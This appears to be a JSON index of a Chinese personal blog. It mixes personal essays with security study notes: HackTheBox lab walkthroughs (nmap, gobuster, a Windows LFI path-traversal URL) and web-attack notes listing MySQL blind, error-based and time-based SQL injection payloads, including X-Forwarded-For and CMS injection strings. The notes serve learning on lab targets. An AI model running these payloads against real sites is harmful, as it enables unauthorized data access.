tee命令用于读取标准输入的数据，并将其内容输出成文件。\n\ntee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。\n\n```bash\ntee [-ai][--help][--version][文件...]\n```\n\n**参数**：\n\n- a或--append　附加到既有文件的后面，而非覆盖它．\n- i或--ignore-interrupts　忽略中断信号。\n- -help　在线帮助。\n- -version　显示版本信息。\n\n```bash\n┌──(root㉿kali)-[/home/kali]\n└─# nmap -sV 10.129.115.172                    \nStarting Nmap 7.93 ( <https://nmap.org> ) at 2023-07-14 03:36 EDT\nNmap scan report for 10.129.115.172\nHost is up (0.30s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at <https://nmap.org/submit/> .\nNmap done: 1 IP address (1 host up) scanned in 108.80 seconds\n                                                                                                              \n┌──(root㉿kali)-[/home/kali]\n└─# echo \"10.129.115.172 thetoppers.htb\" | tee -a /etc/hosts \n10.129.115.172 thetoppers.htb\n```\n\n## **gobuster相关**\n\n然后gobuster无法扫描出结果啦，真是醉了，也无法更改默认响应时间。\n\n但是临下班顺手使用DNS竟然给我扫出来了！\n\n```bash\n┌──(root㉿kali)-[/home/kali]\n└─# gobuster dns -w /usr/share/wordlists/amass/subdomains.lst -d thetoppers.htb         \n\n===============================================================\nGobuster v3.5\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     thetoppers.htb\n[+] Threads:    10\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/wordlists/amass/subdomains.lst\n===============================================================\n2023/07/14 04:48:44 Starting gobuster in DNS enumeration mode\n===============================================================\nFound: s3.thetoppers.htb\n                                                                                                              \nProgress: 8215 / 8216 (99.99%)\n===============================================================\n2023/07/14 04:51:49 Finished\n===============================================================\n```\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ gobuster dns --help\nUses DNS subdomain enumeration mode\n\nUsage:\n  gobuster dns [flags]\n\nFlags:\n  -d, --domain string      The target domain\n  -h, --help               help for dns\n  -r, --resolver string    Use custom DNS server (format server.com or server.com:port)\n  -c, --show-cname         Show CNAME records (cannot be used with '-i' option)\n  -i, --show-ips           Show IP addresses\n      --timeout duration   DNS resolver timeout (default 1s)\n      --wildcard           Force continued operation when wildcard found\n\nGlobal Flags:\n      --delay duration    Time each thread waits between requests (e.g. 1500ms)\n      --no-color          Disable color output\n      --no-error          Don't display errors\n  -z, --no-progress       Don't display progress\n  -o, --output string     Output file to write results to (defaults to stdout)\n  -p, --pattern string    File containing replacement patterns\n  -q, --quiet             Don't print the banner and other noise\n  -t, --threads int       Number of concurrent threads (default 10)\n  -v, --verbose           Verbose output (errors)\n  -w, --wordlist string   Path to the wordlist\n\n```\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ gobuster vhost --help\nUses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)\n\nUsage:\n  gobuster vhost [flags]\n\nFlags:\n      --append-domain                     Append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist.\n      --client-cert-p12 string            a p12 file to use for options TLS client certificates\n      --client-cert-p12-password string   the password to the p12 file\n      --client-cert-pem string            public key in PEM format for optional TLS client certificates\n      --client-cert-pem-key string        private key in PEM format for optional TLS client certificates (this key needs to have no password)\n  -c, --cookies string                    Cookies to use for the requests\n      --domain string                     the domain to append when using an IP address as URL. If left empty and you specify a domain based URL the hostname from the URL is extracted\n      --exclude-length ints               exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.\n  -r, --follow-redirect                   Follow redirects\n  -H, --headers stringArray               Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'\n  -h, --help                              help for vhost\n  -m, --method string                     Use the following HTTP method (default \"GET\")\n      --no-canonicalize-headers           Do not canonicalize HTTP header names. If set header names are sent as is.\n  -k, --no-tls-validation                 Skip TLS certificate verification\n  -P, --password string                   Password for Basic Auth\n      --proxy string                      Proxy to use for requests [http(s)://host:port]\n      --random-agent                      Use a random User-Agent string\n      --retry                             Should retry on request timeout\n      --retry-attempts int                Times to retry on request timeout (default 3)\n      --timeout duration                  HTTP Timeout (default 10s)\n  -u, --url string                        The target URL\n  -a, --useragent string                  Set the User-Agent string (default \"gobuster/3.5\")\n  -U, --username string                   Username for Basic Auth\n\nGlobal Flags:\n      --delay duration    Time each thread waits between requests (e.g. 1500ms)\n      --no-color          Disable color output\n      --no-error          Don't display errors\n  -z, --no-progress       Don't display progress\n  -o, --output string     Output file to write results to (defaults to stdout)\n  -p, --pattern string    File containing replacement patterns\n  -q, --quiet             Don't print the banner and other noise\n  -t, --threads int       Number of concurrent threads (default 10)\n  -v, --verbose           Verbose output (errors)\n  -w, --wordlist string   Path to the wordlist\n\n```\n\n\n\n## **反弹shell**\n\n1、[反弹shell，看这一篇就够了](https://xz.aliyun.com/t/9488)\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"历经十年找寻毕生热爱之事","url":"/2023/07/13/历经十年找寻毕生热爱之事/","content":"\n初中我有一个不属于现实世界的世界存在于我的幻想里，就小学五年级到初二那段时间我觉得我其实离那个世界很近很近，他们每天都在我的幻想重叠着我的现实生活出现，不是幻觉那种哈我没精神病，就是单纯幻想世界。很真实很真实，我为此还写了一部分小说，那时候写的主角一般都跟我同龄。\n\n每次我看见这个世界发生的事情就很开心很开心，而且大部分是爽剧，我幻想里的剧情还有好多可爱大姐姐（这不是重点），有三个，她们很厉害，友谊也地久天长算是世家了。\n\n后面初三到高中这个世界暗淡下去了。他们也很少再出现在我的幻想里，频率高的时候，那几年他们都故事居然都是连续的，每天醒着的三分之一的时间都会出现。现在想想小初的自己都好厉害，当时她们的剧情也是关于爽文友谊修仙超能力那种相关的。\n\n初中那时候也很喜欢心理学和推理。参加过两届梦幻推理大赛（没啥名次，就玩啦，记得有次跟勒由认真做了第一轮的题），经常看心理学的书，但是看的不是学术严谨的教科书，那时候搜集资料信息渠道也没有像现在这样多。\n\n高中太灰暗啦。仿佛失去了梦想一般，虽然也有一小部分感兴趣的，但是依然无法持久。并且整天无所事事，焦虑，抑郁，不安.....初中也有不安但是没那么严重。\n\n然后就有了毕业留言册这个：\n\n![](../image/image-20230713191408000.png)\n\n那时候报专业为什么选择心理学，只是那时候确实喜欢心理学，但是完全没有考虑过未来要做什么学心理有没有工作等等，就是喜欢就去学了。\n\n好的是因为这个专业，女老师们和心理学一些知识，包括我也远离了家我以前那种状态彻底没了，仿佛开始新生活一样。算是彻彻底底调理好了吧。17-18，我总说这两年是我整个人生中状态最好的一年。\n\n刚刚经过某大学朋友提醒，当时还参加了egt的类似夏令营的活动（但是那个机构整体运营模式就是传销模式，洗脑模式，最后公司合伙人17还是18年分道扬镳了），学了音标，演讲，做了很多脱离日常的事情，包括：公交车地铁高铁厚脸皮演讲高价售卖矿泉水棒棒糖、口吞火、每天六点二十起床去早读、和一群有意思的人做一些事儿哈哈...\n\n![](../image/image-20230715003715397.png)\n\n![](../image/image-20230715003744879.png)\n\n![](/image-20230715003758547.png)\n\n![](/image-20230715003811358.png)\n\n下来状态次好可能就是到今年了。\n\n19年初我又陷入了困境。\n\n到底怎样才能冲破桎梏？\n\n那时候因为快毕业我终于开始考虑现实生活了，定居在哪个城市未来要做什么等等。\n\n但是被这些事情困住以及复习应试就很难再去体验前两年那种心流的状态。\n\n心流状态真的很好，就像无副作用的毒品一样，体验了一次就会让人欲罢不能。\n\n并且我知道如何长时间到达这种状态持续下去，那就是去做喜欢的事，热爱的事。\n\n问题就来了，当时的我并没有特别特别热爱的事情，虽然有感兴趣的事情，包括心理学，咨询相关，甚至哲学史这些，却总让我觉得这或许不够。而且这都是屠龙之术，非常难评。未来也找不到相关工作。我想找一件我既会热爱，并且又能养活自己的事情。\n\n当时喜欢统计数据分析这种，还是因为本科的课程，后面就冲计算机了，已经很接近的，但纯编码仍然不喜欢呢。数据类要数学超强硕博起步，当时知道安全这些，但是仍然了解不多接触不多。\n\n![](/image-20230715003834057.png)\n\n然后考研学了数学和计算机最基础的一门专业课，后面不考了打算工作，找了一个情报舆情监测分析类岗位（是想做的行业，但是工资低）。干了没几个月，接着就是又机缘巧合幸运去大学又续了两年，哈哈哈，那时候日子安逸，并且确实对纯编码觉得枯燥，也没好好学，21年下半年又谈恋爱去了。好的是接触到了女权，勇猛打拳半年，开开心心去见女朋友！\n\n这时候已经没有刻意去寻找热爱什么了。就是顺其自然，仍然没有冲破桎梏。\n\n不过快毕业的时候就已经想做安全领域了，奈何入门和接近这些很难，自学也非常困难，路径不像开发那样平缓，开发资料多路途分明。安全还是蛮小一个圈子。\n\n后面又是迷迷糊糊浑浑噩噩过了大半年，逃离了父亲给我安排的坑我的工作（不适合+不喜欢+工资低），不得不说母父总在坑我的道路上持之以恒，最终终于按照自己的规划和想法找到了相近的测试工作。\n\n接着就是今年三四月正式工作之余开始学习安全相关的东西。\n\n但是最近又太动荡了，同事仲裁收集证据、朋友被骗去传销我去报警、我骑自行车翻车了、和某些博主对冲被挂、五月底新冠一阳、再加上沙雕领导，啊啊啊啊啊啊。没有平静的生活耶，嘻嘻~\n\n最近感觉仿佛又回到了2017~2018年那个时间段。\n\n就是这个对了的感觉，经常可以进入心流状态的事件。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["随笔"],"categories":["碎碎念"]},{"title":"HTB-Responder","url":"/2023/07/12/HTB-Responder/","content":"\n# Responder\n\n## Introduction\n\nWindows is the most predominant operating system in today's world because of its easy-to-use GUI accessibility. About 85% of the market share has become a critical OS to attack. Furthermore, most organizations use Active Directory to set up their Windows domain networks. Microsoft employs NTLM (New Technology LAN Manager) & Kerberos for authentication services. Despite known vulnerabilities, NTLM remains widely deployed even on new systems to maintain compatibility with legacy clients and servers.\nThis lab focuses on how a File Inclusion vulnerability on a webpage being served on a windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server. We will use a utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper to test millions of potential passwords to see if they match the one used to create the hash. We will also be taking a deeper look at the working process of NTLM authentication and how the Responder utility captures the challenge. We believe that it's crucial to understand the under the hood workings of a tool or a framework as it strengthens the foundation of one's understanding, which aids in the real world exploit scenarios that one might face, which do not appear to be vulnerable at the first look. Let's dive straight into it.\n\n---\n\nWindows是当今世界上最主要的操作系统，因为它易于使用的GUI可访问性。大约85%的市场份额已经成为攻击的关键操作系统。此外，大多数组织都使用Active Directory来设置其Windows域网络。Microsoft使用NTLM（新技术局域网管理器）和Kerberos进行身份验证服务。尽管存在已知的漏洞，NTLM仍然被广泛部署在新系统上，以保持与旧客户端和服务器的兼容性。\n本实验室的重点是如何利用windows计算机上提供的网页上的文件包含漏洞来收集运行web服务器的用户的NetNTLMv2挑战。我们将使用一个名为Responder的实用程序来捕获NetNTLMv2哈希，然后使用一个称为john the ripper的实用程序测试数百万个潜在密码，看看它们是否与用于创建哈希的密码匹配。我们还将深入了解NTLM身份验证的工作过程，以及响应程序实用程序如何应对这一挑战。我们认为，理解一个工具或框架的幕后工作至关重要，因为它加强了人们理解的基础，有助于在现实世界中利用人们可能面临的场景，而这些场景乍一看并不脆弱。让我们直接切入。\n\n## Enumeration\n\nWe will begin by scanning the host for any open ports and running services with a Nmap scan. We will be using the following flags for the scan:\n\n<aside>\n📎 p- : This flag scans for all TCP ports ranging from 0-65535\n-sV : Attempts to determine the version of the service running on a port\n--min-rate : This is used to specify the minimum number of packets Nmap should send per\nsecond; it speeds up the scan as the number goes higher\n\n\n</aside>\n\n> Nmap如何确定端口上运行的服务？\n> Nmap使用知名服务的端口服务数据库来确定在特定端口上运行的服务。它稍后还会向该端口发送一些特定于服务的请求，以确定服务版本和任何有关它的附加信息。\n> 因此，对于特定端口的服务信息，Nmap大多是但并不总是正确的。\n\nAccording to the results of the Nmap scan, the machine is using Windows as its operating system. Two ports were detected as open having Apache web server running on port 80 along with WinRM on port 5985 .\n\n根据Nmap扫描的结果，该机器正在使用Windows作为其操作系统。检测到两个端口打开，Apache web服务器在端口80上运行，WinRM在端口5985上运行。\n\n<aside>\n❓ Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as Operating Systems and applications. WinRM allows the user to :\n→ Remotely communicate and interface with hosts\n→ Execute commands remotely on systems that are not local to you but are network accessible.\n→ Monitor, manage and configure servers, operating systems and client machines from a remote location.\nAs a pentester, this means that if we can find credentials (typically username and password) for a user who has remote management privileges, we can potentially get a PowerShell shell on the host.\n\n\n</aside>\n\n<aside>\n❓ Windows远程管理（WinRM）是一种Windows本机内置远程管理协议，基本上使用简单对象访问协议与远程计算机和服务器以及操作系统和应用程序进行交互。WinRM允许用户：\n→ 与主机远程通信和接口\n→ 在非本地但可通过网络访问的系统上远程执行命令。\n→ 从远程位置监视、管理和配置服务器、操作系统和客户端机器。\n作为pentester，这意味着如果我们能找到具有远程管理权限的用户的凭据（通常是用户名和密码），我们就有可能在主机上获得PowerShell shell。\n\n\n</aside>\n\n## Website Enumeration\n\nOn opening Firefox and putting http://[target ip] , the browser returns a message about being unable to find that site. Looking in the URL bar, it now shows [http://unika.htb](http://unika.htb/) . The website has redirected the browser to a new URL, and your host doesn't know how to find unika.htb . This webserver is employing name-based Virtual Hosting for serving the requests.\n\n打开Firefox并放入http://[target-ip]后，浏览器会返回一条无法找到该网站的消息。在URL栏中查看，它现在显示http://unika.htb。该网站已将浏览器重定向到一个新的URL，而您的主机不知道如何找到unika.htb。该Web服务器使用基于名称的虚拟主机来满足请求。\n\nName-Based Virtual hosting is a method for hosting multiple domain names (with separate handling ofeach name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname.\nThe web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.\n\n基于名称的虚拟托管是一种在单个服务器上托管多个域名（每个名称单独处理）的方法。这允许一台服务器共享其资源，例如内存和处理器周期，而不需要同一主机名使用所有服务。\nweb服务器检查HTTP请求的主机头字段中提供的域名，并根据该域名发送响应。\nThe /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in the /etc/hosts file for this domain to enable the browser to resolve the address for unika.htb .\n\n/etc/hosts文件用于将主机名解析为IP地址&因此，我们需要在该域的/etc/host文件中添加一个条目，以使浏览器能够解析unika.htb的地址。\n\nEntry in the /etc/hosts file :\n\n```bash\necho \"10.129.136.91 unika.htb\" | sudo tee -a /etc/hosts\n```\n\nAdding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika.htb to\nthe corresponding IP address & thus make the browser include the HTTP header Host: unika.htb in\nevery HTTP request that the browser sends to this IP address, which will make the server respond with the webpage for unika.htb .\n\n在/etc/hosts文件中添加此条目将使浏览器能够将主机名unika.htb解析为相应的IP地址，从而使浏览器在向该IP地址发送的每个HTTP请求中都包含HTTP标头Host:unika.htb，这将使服务器以unika.h结核的网页进行响应。\nOn accessing the web page we are presented with a web designing business landing page.\n\n在访问网页时，我们会看到一个网页设计业务登录页。\n\nChecking the site out, we see nothing of particular interest. Although, we notice a language selection option on the navbar EN and changing the option to FR takes us to a French version of the website.\n\n查看网站，我们没有发现任何特别感兴趣的东西。尽管如此，我们注意到导航栏EN上有一个语言选择选项，将该选项更改为FR会将我们带到该网站的法语版本。\n\nNoticing the URL, we can see that the french.html page is being loaded by the page parameter, which may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.\n\n注意到URL，我们可以看到french.html页面是由页面参数加载的，如果页面输入没有被清除，它可能会受到本地文件包含（LFI）漏洞的攻击。\n\n## File Inclusion Vulnerability\n\nDynamic websites include HTML pages on the fly using information from the HTTP request to include GET and POST parameters, cookies, and other variables. It is common for a page to \"include\" another page based on some of these parameters.\n\n动态网站包括动态HTML页面，使用HTTP请求中的信息，包括GET和POST参数、cookie和其他变量。一个页面通常会根据其中一些参数“包含”另一个页面。\n\n<aside>\n💡 LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.\n\n\n</aside>\n\n当攻击者能够使网站包含一个不打算作为此应用程序选项的文件时，就会发生LFI或本地文件包含。一个常见的例子是应用程序使用文件的路径作为输入。如果应用程序将此输入视为可信输入，并且未对此输入执行所需的卫生检查，则攻击者可以使用../字符串，并最终查看本地文件系统中的敏感文件。在某些有限的情况下，LFI也可以导致代码执行。\n\n<aside>\n💡 RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.\n\n\n</aside>\n\nRFI或远程文件包含类似于LFI，但在这种情况下，攻击者有可能使用HTTP、FTP等协议在主机上加载远程文件。\n\nWe test the page parameter to see if we can include files on the target system in the server response. We will test with some commonly known files that will have the same name across networks, Windows domains, and systems which can be found here. One of the most common files that a penetration tester might attempt to access on a Windows machine to verify LFI is the hosts file, WINDOWS\\System32\\drivers\\etc\\hosts (this file aids in the local translation of host names to IP\naddresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\\ .\n\n我们测试页面参数，看看是否可以在服务器响应中包括目标系统上的文件。我们将使用一些常见的文件进行测试，这些文件将在网络、Windows域和系统中具有相同的名称，这些文件可以在此处找到。渗透测试人员可能试图在Windows机器上访问以验证LFI的最常见文件之一是hosts文件Windows\\System32\\drivers\\etc\\hosts（该文件有助于将主机名本地转换为IP地址）。../字符串用于一次遍历一个目录。因此倍数../字符串包含在URL中，以便服务器上的文件处理程序遍历回基本目录，即C:\\。\n\n```bash\nhttp://unika.htb/index.php?\npage=../../../../../../../../windows/system32/drivers/etc/hosts\n```\n\nGreat, LFI is possible as we can view the contents of the C:\\windows\\system32\\drivers\\etc\\hosts file in the response.\n\n很好，LFI是可能的，因为我们可以在响应中查看C:\\windows\\system32\\drivers\\etc\\hosts文件的内容。\nThe file inclusion, in this case, was made possible because in the backend the include() method of PHP is being used to process the URL parameter page for serving a different webpage for different languages. And because no proper sanitization is being done on this page parameter, we were able to pass malicious input and therefore view the internal system files.\n在这种情况下，之所以可以包含文件，是因为在后端，PHP的include（）方法被用于处理URL参数页面，以便为不同语言的不同网页提供服务。由于没有对此页面参数进行适当的清理，我们能够传递恶意输入，从而查看内部系统文件。\n\n**What is the include() method in PHP?**\n\n```php\nFile 1 --> vars.php\n<?php\n$color = 'green';\n$fruit = 'apple';\n?>\n#############################################\nFile 2 --> test.php\n<?php\necho \"A $color $fruit\"; // output = \"A\"\ninclude 'vars.php';\necho \"A $color $fruit\"; // output = \"A green apple\"\n?>\n```\n\n[https://www.php.net/manual/en/function.include.php](https://www.php.net/manual/en/function.include.php)\n\n**What is NTLM (New Technology Lan Manager)?**\n\nNTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response\nauthentication protocol used to authenticate a client to a resource on an Active Directory domain.\nIt is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor only once, at login.\n\nNTLM是由Microsoft创建的身份验证协议的集合。它是一种质询-响应身份验证协议，用于将客户端身份验证为Active Directory域上的资源。\n它是一种单点登录（SSO），因为它只允许用户在登录时提供一次底层身份验证因素。\n\nThe NTLM authentication process is done in the following way :\n\n1. The client sends the user name and domain name to the server.\n2. The server generates a random character string, referred to as the challenge.\n3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.\n4. The server retrieves the user password (or equivilent).\n5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.\n\n<aside>\n💡 NTLM身份验证过程通过以下方式完成：\n1.客户端将用户名和域名发送给服务器。\n2.服务器生成一个随机字符串，称为挑战。\n3.客户端使用用户密码的NTLM哈希对质询进行加密，并将其发送回服务器。\n4.服务器检索用户密码（或等效密码）。\n5.服务器使用从安全帐户数据库中检索到的哈希值来加密质询字符串。然后将该值与从客户端接收到的值进行比较。如果值匹配，则对客户端进行身份验证。\n\n\n</aside>\n\nNTLM与NTHash与NetNTLMv2\n\n关于NTLM身份验证的术语很混乱，甚至专业人士也会不时滥用它，所以让我们定义一些关键术语：\n\n- 散列函数是一种单向函数，它接受任意数量的数据并返回固定大小的值。\n  通常，结果被称为散列、摘要或指纹。它们用于更安全地存储密码，因为无法将哈希直接转换回原始数据（尽管也有试图从哈希中恢复密码的攻击，我们稍后会看到）。因此，服务器可以存储您的密码散列，当您将密码提交到网站时，它会对您的输入进行散列，并将结果与数据库中的散列进行比较，如果它们匹配，它就会知道您提供了正确的密码。\n- NTHash是用于在SAM数据库和域控制器中的Windows系统上存储密码的算法的输出。NTHash通常被称为NTLM哈希，甚至只是NTLM，这非常具有误导性/混淆性。\n- 当NTLM协议想要通过网络进行身份验证时，它会使用如上所述的质询/响应模型。NetNTLMv2质询/响应是一个专门格式化为包括质询和响应的字符串。这通常被称为NetNTLMv2哈希，但实际上并不是哈希。尽管如此，它通常被称为哈希，因为我们以同样的方式攻击它。您将看到NetNTLMv2对象被称为NTLMv2，甚至被混淆为NTLM。\n\n## Using Responder\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"web攻防笔记第44天","url":"/2023/07/11/web攻防笔记第44天/","content":"\n### PHP-MYSQL-SQL操作-增删改查\n\n```sql\n#1、功能：数据查询\n查询：\nSELECT * FROM news where id=$id\n\n#2、功能：新增用户，添加新闻等\n增加：\nINSERT INTO news (字段名) VALUES (数据)\n\n#3、功能：删除用户，删除新闻等\n删除：\nDELETE FROM news WHERE id=$id\n\n#4、功能：修改用户，修改文章等\n修改：\nUPDATE news SET id=$id\n```\n\n\n\n### PHP-MYSQL-注入函数-布尔&报错&延迟\n\n#### **原因：不能回显**\n\n**为了解决常规的联合查询注入不行的情况**\n\n盲注就是在注入过程中，获取的数据不能回显至前端页面。\n\n我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。\n\n\n\n#### 分类\n\n我们可以知道盲注分为以下三类：\n\n`1、基于布尔的SQL盲注-逻辑判断`\n\n`regexp,like,ascii,left,ord,mid`\n\n`2、基于时间的SQL盲注-延时判断`\n\n`if,sleep`\n\n`3、基于报错的SQL盲注-报错回显`\n\n`floor，updatexml，extractvalue`\n\n\n\n##### **延迟**\n\n```sql\nand sleep(1);\nand if(1>2,sleep(1),0);\nand if(1<2,sleep(1),0);\nand if(length(database())=7,sleep(10),0);\nand if(and left(database(),2)='pi',sleep(10),0);\n```\n\n\n\n##### **布尔**\n\n```sql\nand length(database())=7;\nand left(database(),1)='p';\nand left(database(),2)='pi';\nand substr(database(),1,1)='p';\nand substr(database(),2,1)='i';\nand ord(left(database(),1))=112;\n```\n\n\n\n##### **报错**\n\n```sql\nand updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)\nand updatexml(1,concat(0x7e,(SELECT datebase()),0x7e),1)\nand extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));\n```\n\n更多：https://www.jianshu.com/p/bc35f8dd4f7c\n\n\n\n##### 参考\n\n```sql\nlike 'ro%'            #判断ro或ro...是否成立 \n\nregexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等\n\nif(条件,5,0)          #条件成立 返回5 反之 返回0\n\nsleep(5)              #SQL语句延时执行5秒\n\nmid(a,b,c)            #从位置b开始，截取a字符串的c位\n\nsubstr(a,b,c)         #从位置b开始，截取字符串a的c长度\n\nleft(database(),1)，database() #left(a,b)从左侧截取a的前b位\n\nlength(database())=8  #判断数据库database()名的长度\n\nord=ascii ascii(x)=97 #判断x的ascii码是否等于97\n```\n\n\n\n### PHP-MYSQL-注入条件-数据回显&错误处理\n\nPHP开发项目-输出结果&开启报错\n\n```sql\n#基于延时：都不需要\nand if(1=1,sleep(5),0)\n```\n\n```sql\n#基于布尔：有数据库输出判断标准（数据回显）\nand length(database())=6\n```\n\n```sql\n#基于报错：有数据库报错处理判断标准（容错处理）\n注：代码中有`or die(mysqli_error($con));`会报错回显\n\nand updatexml(1,concat(0x7e,(SELECT @@version()),0x7e),1)\nand updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)\n```\n\n```sql\n#测试delete注入：（有无回显，有无报错）\n\n删除（延迟）：1 and/or if(1=1,sleep(5),0)\n\n删除（布尔）：3 and length(database())=6（无回显 无法判断注入）\n\n删除（报错）：4 and updatexml(1,concat(0x7e,(SELECT version),0x7e),1)\n```\n\n\n\n### PHP-MYSQL-CMS案例-插入报错&删除延时\n\n1、xhcms-insert报错\n\n```\n' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '\n```\n\n#### 黑盒注入思路\n\n**盲注：报错和延迟都可以**\n\n**1、报错：有可能会失败，需要看代码段有没有写那个报错的代码段**\n\n**2、延迟：大部分都可以，可不可以还要看一个条件：符号的问题，能不能注释闭合**\n\n\n\n2、kkcms-delete延时\n\n```sql\nand if(1=1,sleep(5),0)\n\nor if(1=1,sleep(5),0)\n\nor if(ord(left(database(),1))=107,sleep(2),0)\n```\n\n\n\n空格：%20\n\n若有单引号过滤，可用ASCII码替换\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"web攻防笔记第43天","url":"/2023/07/09/web攻防笔记第43天/","content":"\n### 为什么注入失败？\n\n由于开发者对于数据类型和SQL语句写法（框架写法）导致SQL注入拼接失败。\n\n注释类型包括：单引号'、百分号%'、框架括号')\n\n有时候会有无法注释的情况：`limit 0, 1`、`order by`\n\n--+\n\n#### 常见注释类型\n\n1、数字型(无符号干扰)\n\n`select * from news where id=$id;`\n\n2、字符型（有符号干扰）\n\n`select * from news where id='$id';`\n\n3、搜索型（有多符号干扰）\n\n`select * from news where id like '%$id%'`\n\n4、框架型（有各种符号干扰）\n\n`select * from news where id=('$id');`\n\n`select * from news where (id='$id');`\n\n\n\n**文件上传有可能会导致注入！**\n\n`img = union select`\n\n`img_value { 'union select' }`\n\n插入数据事件insert\n\n`insert news (\"title\", \"content\", \"author\", \"date\", \"img\")`\n\n\n\n### `PHP-MYSQL-`数据请求方法（常见）\n\n全局变量方法：`GET POST SERVER FILES HTTP`头等\n\n##### 1、`GET：`URL上\n\n##### 2、`POST：`URL看不到，但不代表不存在，也是注入点，可用BP抓包改参数\n\n##### 3、`SERVER：`（主要看功能或代码里接收哪个，就改哪个）\n\n`User-Agent：`\n\n使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）\n\n`Cookie：`\n\n网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据\n\n`Rerferer：`浏览器向 WEB 服务器表明自己是从哪个页面链接过来的\n\n`Host：`客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号\n\n\n\n##### 4、`X-Forwarded-For：`\n\n简称`XFF`头，它代表客户端，也就是`HTTP`的请求端真实的`IP`，（通常一些网站的防注入功能会记录请求端真实`IP`地址并写入数据库or某文件 [**通过修改`XXF`头可以实现伪造`IP`**]）\n\n若在代码中X-Forwarded-For获取到的IP变量写进了sql执行语句中，则可以实现注入。\n\n```mysql\n#源代码中的隐患语句\n$sql = \"select * from admin where ip='$ip'\";\n#数据包中X-Forwarded-For参数（IP）修改\ndasdsdas' union select 1,datebase(),user(),4 and '1'='1\n\n#如果把ip写死去判断，有绕过隐患，ip放在配置文件或代码申明中\nif（$ip=='127.0.01'）{...}\n```\n\n\n\n##### 功能点\n\n1、用户登录时\n\n2、登录判断IP时\n\n是PHP特性中的`$_SERVER['HTTP_X_FORWARDED_FOR'];`接受IP的绕过（可伪造，绕过）\n\n实现：代码配置固定IP去判断-策略绕过\n\n实现：数据库白名单IP去判断-select注入\n\n实现：防注入，记录IP去保存数据库-insert注入\n\n3、文件上传将文件名写入数据库-insert注入\n\n\n\n### `PHP-MYSQL-`数据请求格式\n\n1、数据采用统一格式传输，后端进行格式解析带入数据库（`json`）\n\n2、数据采用加密编码传输，后端进行解密解码带入数据库（`base64`）-`CapyfCncoder V3`\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"Poc编写相关资料","url":"/2023/07/08/Poc编写相关资料/","content":"\nXray官方编写poC文档：https://docs.xray.cool/#/guide/yaml/yaml_poc_template\n\n漏洞检测的那些事：https://paper.seebug.org/9/\n\n","tags":["笔记","漏洞","Poc"],"categories":["学习","厮杀战场"]},{"title":"关于我发小的这件事带给我了什么","url":"/2023/07/07/关于我发小打算结昏这件事带给我了什么/","content":"\n...........\n\n沉没成本真高啊。非常无语。\n\n总之她就像被什么东西忽然夺舍了一样。\n\n我翻到了六年半前的聊天记录了：\n\n<img src=\"..\\image\\6.5.jpg\" alt=\"和我聊天的她\" style=\"zoom:50%;\" 